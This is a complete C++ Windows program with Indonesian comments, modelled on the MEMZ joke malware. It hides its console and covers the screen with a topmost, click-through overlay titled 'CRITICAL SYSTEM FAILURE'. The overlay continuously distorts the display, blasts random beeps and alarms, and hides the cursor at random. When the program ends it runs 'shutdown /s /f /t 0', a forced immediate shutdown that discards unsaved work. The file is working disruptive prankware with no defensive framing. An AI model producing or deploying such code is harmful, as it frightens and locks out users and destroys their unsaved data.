#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <mmsystem.h>
#include <thread>
#include <vector>
#include <algorithm>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")

// Konfigurasi intensitas
const int REFRESH_RATE = 10; // Refresh rate sangat cepat
const int MAX_GLITCH_INTENSITY = 1000;
const int GLITCH_LINES = 500;
const int MAX_GLITCH_BLOCKS = 300;
const int SOUND_CHANCE = 2; // 50% chance setiap frame memainkan suara

// Variabel global
HBITMAP hGlitchBitmap = NULL;
BYTE* pPixels = NULL;
int screenWidth, screenHeight;
BITMAPINFO bmi = {};
int intensityLevel = 1;
DWORD startTime = GetTickCount();
int cursorX = 0, cursorY = 0;
bool cursorVisible = true;
int screenShakeX = 0, screenShakeY = 0;

// Struktur untuk efek partikel
struct Particle {
    float x, y;
    float vx, vy;
    DWORD life;
    DWORD maxLife;
    COLORREF color;
};

std::vector<Particle> particles;

// Fungsi untuk memainkan suara glitch secara asinkron
void PlayGlitchSoundAsync() {
    std::thread([]() {
        int soundType = rand() % 20;
        
        switch (soundType) {
        case 0: case 1: case 2:
            PlaySound(TEXT("SystemHand"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 3: case 4:
            PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 5: case 6:
            Beep(rand() % 3000 + 500, rand() % 200 + 50);
            break;
        case 7: case 8:
            // Suara white noise digital intens
            for (int i = 0; i < 30; i++) {
                Beep(rand() % 4000 + 500, 20);
                Sleep(5);
            }
            break;
        case 9: case 10:
            // Suara frekuensi rendah
            Beep(rand() % 100 + 50, rand() % 300 + 300);
            break;
        case 11: case 12:
            // Kombinasi suara acak intens
            for (int i = 0; i < 20; i++) {
                Beep(rand() % 3000 + 500, rand() % 50 + 20);
                Sleep(5);
            }
            break;
        case 13: case 14:
            // Suara panjang dengan perubahan frekuensi
            for (int i = 0; i < 200; i += 2) {
                Beep(500 + i * 20, 10);
            }
            break;
        default:
            // Suara statis panjang dengan intensitas tinggi
            for (int i = 0; i < 50; i++) {
                Beep(rand() % 4000 + 500, 30);
                Sleep(1);
            }
            break;
        }
    }).detach();
}

void CaptureScreen(HWND) {  // Parameter tidak digunakan
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    if (!hGlitchBitmap) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screenWidth;
        bmi.bmiHeader.biHeight = -screenHeight;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    }
    
    if (hGlitchBitmap) {
        SelectObject(hdcMem, hGlitchBitmap);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    }
    
    // Tangkap posisi kursor
    POINT pt;
    GetCursorPos(&pt);
    cursorX = pt.x;
    cursorY = pt.y;
    
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyColorShift(BYTE* pixels, int shift) {
    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
        // Pastikan tidak melebihi batas array
        if (i + shift + 2 < screenWidth * screenHeight * 4) {
            BYTE temp = pixels[i];
            pixels[i] = pixels[i + shift];
            pixels[i + shift] = temp;
        }
    }
}

void ApplyScreenShake() {
    screenShakeX = (rand() % 20 - 10) * intensityLevel;
    screenShakeY = (rand() % 20 - 10) * intensityLevel;
}

void ApplyCursorEffect() {
    if (!cursorVisible || !pPixels) return;
    
    // Gambar efek distorsi di sekitar kursor
    int cursorSize = std::min(30 * intensityLevel, 300);
    int startX = std::max(cursorX - cursorSize, 0);
    int startY = std::max(cursorY - cursorSize, 0);
    int endX = std::min(cursorX + cursorSize, screenWidth - 1);
    int endY = std::min(cursorY + cursorSize, screenHeight - 1);
    
    for (int y = startY; y <= endY; y++) {
        for (int x = startX; x <= endX; x++) {
            // PERBAIKAN: Sintaks perhitungan jarak yang benar
            float dx = static_cast<float>(x - cursorX);
            float dy = static_cast<float>(y - cursorY);
            float dist = sqrt(dx * dx + dy * dy);
            
            if (dist < cursorSize) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                    // Ubah warna pixel di sekitar kursor
                    pPixels[pos] = 255 - pPixels[pos]; // Blue
                    pPixels[pos + 1] = 255 - pPixels[pos + 1]; // Green
                    pPixels[pos + 2] = 255 - pPixels[pos + 2]; // Red
                    
                    // Tambahkan efek distorsi radial
                    if (dist < cursorSize / 2) {
                        float amount = 1.0f - (dist / (cursorSize / 2.0f));
                        int shiftX = static_cast<int>(dx * amount * 5);
                        int shiftY = static_cast<int>(dy * amount * 5);
                        
                        int srcX = x - shiftX;
                        int srcY = y - shiftY;
                        
                        if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                            int srcPos = (srcY * screenWidth + srcX) * 4;
                            if (srcPos >= 0 && srcPos < screenWidth * screenHeight * 4 - 4) {
                                pPixels[pos] = pPixels[srcPos];
                                pPixels[pos + 1] = pPixels[srcPos + 1];
                                pPixels[pos + 2] = pPixels[srcPos + 2];
                            }
                        }
                    }
                }
            }
        }
    }
}

void UpdateParticles() {
    // Tambahkan partikel baru secara acak
    if (rand() % 20 == 0) {
        Particle p;
        p.x = rand() % screenWidth;
        p.y = rand() % screenHeight;
        p.vx = (rand() % 100 - 50) / 10.0f;
        p.vy = (rand() % 100 - 50) / 10.0f;
        p.life = 0;
        p.maxLife = 50 + rand() % 200;
        p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
        particles.push_back(p);
    }
    
    // Perbarui dan hapus partikel
    for (auto it = particles.begin(); it != particles.end(); ) {
        it->x += it->vx;
        it->y += it->vy;
        it->life++;
        
        if (it->life > it->maxLife) {
            it = particles.erase(it);
        } else {
            // Gambar partikel
            int x = static_cast<int>(it->x);
            int y = static_cast<int>(it->y);
            if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                    pPixels[pos] = GetBValue(it->color);
                    pPixels[pos + 1] = GetGValue(it->color);
                    pPixels[pos + 2] = GetRValue(it->color);
                }
            }
            ++it;
        }
    }
}

void ApplyGlitchEffect() {
    if (!pPixels) return;
    
    BYTE* pCopy = new BYTE[screenWidth * screenHeight * 4];
    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
    
    // Tingkatkan intensitas seiring waktu
    DWORD currentTime = GetTickCount();
    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 10000);
    intensityLevel = std::min(10, timeIntensity);
    
    // Terapkan efek guncangan layar
    ApplyScreenShake();
    
    // Glitch garis horizontal intens
    for (int i = 0; i < GLITCH_LINES * intensityLevel; ++i) {
        int y = rand() % screenHeight;
        int height = 1 + rand() % (50 * intensityLevel);
        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 2 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel;
        
        // Batasi height agar tidak melebihi batas layar
        height = std::min(height, screenHeight - y);
        if (height <= 0) continue;
        
        for (int h = 0; h < height; ++h) {
            int currentY = y + h;
            if (currentY >= screenHeight) break;
            
            BYTE* source = pCopy + (currentY * screenWidth * 4);
            BYTE* dest = pPixels + (currentY * screenWidth * 4);
            
            if (xOffset > 0) {
                int copySize = (screenWidth - xOffset) * 4;
                if (copySize > 0) {
                    memmove_s(dest + xOffset * 4, 
                             (screenWidth * 4) - (xOffset * 4),
                             source, 
                             copySize);
                }
                for (int x = 0; x < xOffset; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            } 
            else if (xOffset < 0) {
                int absOffset = -xOffset;
                int copySize = (screenWidth - absOffset) * 4;
                if (copySize > 0) {
                    memmove_s(dest, 
                             screenWidth * 4,
                             source + absOffset * 4, 
                             copySize);
                }
                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            }
        }
    }
    
    // Distorsi blok ekstrim
    for (int i = 0; i < MAX_GLITCH_BLOCKS * intensityLevel; ++i) {
        int blockWidth = std::min(50 + rand() % (200 * intensityLevel), screenWidth);
        int blockHeight = std::min(50 + rand() % (200 * intensityLevel), screenHeight);
        int x = rand() % (screenWidth - blockWidth);
        int y = rand() % (screenHeight - blockHeight);
        int offsetX = (rand() % (300 * intensityLevel)) - 150 * intensityLevel;
        int offsetY = (rand() % (300 * intensityLevel)) - 150 * intensityLevel;
        
        for (int h = 0; h < blockHeight; h++) {
            int sourceY = y + h;
            int destY = sourceY + offsetY;
            
            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                
                // Pastikan blok tidak keluar batas
                int effectiveWidth = blockWidth;
                if (x + offsetX + blockWidth > screenWidth) {
                    effectiveWidth = screenWidth - (x + offsetX);
                }
                if (x + offsetX < 0) {
                    effectiveWidth = blockWidth + (x + offsetX);
                    source -= (x + offsetX) * 4;
                    dest -= (x + offsetX) * 4;
                }
                
                if (effectiveWidth > 0 && dest >= pPixels && 
                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
                    memcpy_s(dest, effectiveWidth * 4, source, effectiveWidth * 4);
                }
            }
        }
    }
    
    // Shift warna acak
    if (intensityLevel > 0 && (rand() % std::max(1, 5 / intensityLevel)) == 0) {
        ApplyColorShift(pPixels, (rand() % 3) + 1);
    }
    
    // Efek noise digital
    for (int i = 0; i < screenWidth * screenHeight * intensityLevel / 2; i++) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        int pos = (y * screenWidth + x) * 4;
        
        if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
            pPixels[pos] = rand() % 256;
            pPixels[pos + 1] = rand() % 256;
            pPixels[pos + 2] = rand() % 256;
        }
    }
    
    // Efek distorsi radial
    if (intensityLevel > 0 && (rand() % std::max(1, 6 / intensityLevel)) == 0) {
        int centerX = rand() % screenWidth;
        int centerY = rand() % screenHeight;
        int radius = std::min(100 + rand() % (500 * intensityLevel), screenWidth/2);
        int distortion = 20 + rand() % (80 * intensityLevel);
        
        int yStart = std::max(centerY - radius, 0);
        int yEnd = std::min(centerY + radius, screenHeight);
        int xStart = std::max(centerX - radius, 0);
        int xEnd = std::min(centerX + radius, screenWidth);
        
        for (int y = yStart; y < yEnd; y++) {
            for (int x = xStart; x < xEnd; x++) {
                float dx = static_cast<float>(x - centerX);
                float dy = static_cast<float>(y - centerY);
                float distance = sqrt(dx*dx + dy*dy);
                
                if (distance < radius) {
                    float amount = pow(1.0f - (distance / radius), 2.0f);
                    int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 3 - 1));
                    int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 3 - 1));
                    
                    int srcX = x - shiftX;
                    int srcY = y - shiftY;
                    
                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                        int srcPos = (srcY * screenWidth + srcX) * 4;
                        int destPos = (y * screenWidth + x) * 4;
                        
                        if (destPos >= 0 && destPos < screenWidth * screenHeight * 4 - 4 && 
                            srcPos >= 0 && srcPos < screenWidth * screenHeight * 4 - 4) {
                            pPixels[destPos] = pCopy[srcPos];
                            pPixels[destPos + 1] = pCopy[srcPos + 1];
                            pPixels[destPos + 2] = pCopy[srcPos + 2];
                        }
                    }
                }
            }
        }
    }
    
    // Efek scanline
    if (rand() % 5 == 0) {
        int lineHeight = 1 + rand() % (3 * intensityLevel);
        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
            for (int h = 0; h < lineHeight; h++) {
                if (y + h >= screenHeight) break;
                for (int x = 0; x < screenWidth; x++) {
                    int pos = ((y + h) * screenWidth + x) * 4;
                    if (pos >= 0 && pos < screenWidth * screenHeight * 4 - 4) {
                        // Gunakan clamp sederhana
                        pPixels[pos] = (pPixels[pos] + 100 > 255) ? 255 : pPixels[pos] + 100;
                        pPixels[pos + 1] = (pPixels[pos + 1] + 100 > 255) ? 255 : pPixels[pos + 1] + 100;
                        pPixels[pos + 2] = (pPixels[pos + 2] + 100 > 255) ? 255 : pPixels[pos + 2] + 100;
                    }
                }
            }
        }
    }
    
    // Efek inversi warna acak
    if (intensityLevel > 0 && (rand() % std::max(1, 20 / intensityLevel)) == 0) {
        for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
            if (i < screenWidth * screenHeight * 4 - 4) {
                pPixels[i] = 255 - pPixels[i];
                pPixels[i + 1] = 255 - pPixels[i + 1];
                pPixels[i + 2] = 255 - pPixels[i + 2];
            }
        }
    }
    
    // Efek distorsi kursor
    ApplyCursorEffect();
    
    // Update efek partikel
    UpdateParticles();
    
    // Mainkan suara glitch secara acak (50% peluang setiap frame)
    if (rand() % SOUND_CHANCE == 0) {
        PlayGlitchSoundAsync();
    }
    
    // Toggle visibilitas kursor secara acak
    if (rand() % 100 == 0) {
        cursorVisible = !cursorVisible;
        ShowCursor(cursorVisible);
    }
    
    delete[] pCopy;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HDC hdcLayered = NULL;
    static BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
    
    switch (msg) {
    case WM_CREATE:
        hdcLayered = CreateCompatibleDC(NULL);
        SetTimer(hwnd, 1, REFRESH_RATE, NULL);
        return 0;
        
    case WM_TIMER: {
        CaptureScreen(hwnd);
        ApplyGlitchEffect();
        
        if (hdcLayered && hGlitchBitmap) {
            HDC hdcScreen = GetDC(NULL);
            POINT ptZero = { 0, 0 };  // Diperbaiki inisialisasi
            SIZE size = { screenWidth, screenHeight };
            
            SelectObject(hdcLayered, hGlitchBitmap);
            UpdateLayeredWindow(hwnd, hdcScreen, NULL, &size, hdcLayered, 
                               &ptZero, 0, &blend, ULW_ALPHA);
            
            ReleaseDC(NULL, hdcScreen);
        }
        return 0;
    }
        
    case WM_DESTROY:
        KillTimer(hwnd, 1);
        if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
        if (hdcLayered) DeleteDC(hdcLayered);
        ShowCursor(TRUE); // Pastikan kursor ditampilkan kembali
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    srand(static_cast<unsigned>(time(NULL)));
    startTime = GetTickCount();
    
    // Sembunyikan konsol jika ada
    FreeConsole();
    
    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_HREDRAW | CS_VREDRAW, WndProc,
                      0, 0, hInst, NULL, NULL, NULL, NULL,
                      "MEMZ_GLITCH_SIM", NULL };
    RegisterClassEx(&wc);
    
    HWND hwnd = CreateWindowEx(WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        wc.lpszClassName, "CRITICAL SYSTEM FAILURE",
        WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);
    
    // Set window to cover entire screen including taskbar
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 
                GetSystemMetrics(SM_CXSCREEN), 
                GetSystemMetrics(SM_CYSCREEN), 
                SWP_SHOWWINDOW);
    
    ShowWindow(hwnd, SW_SHOW);
    
    // Mainkan suara startup yang intens
    std::thread([]() {
        // Suara startup intens
        for (int i = 0; i < 5; i++) {
            Beep(300, 100);
            Beep(600, 100);
            Beep(900, 100);
            Sleep(30);
        }
        
        // Suara white noise panjang
        for (int i = 0; i < 30; i++) {
            Beep(rand() % 4000 + 500, 30);
            Sleep(5);
        }
    }).detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Force shutdown setelah keluar
    system("shutdown /s /f /t 0");
    return static_cast<int>(msg.wParam);
}
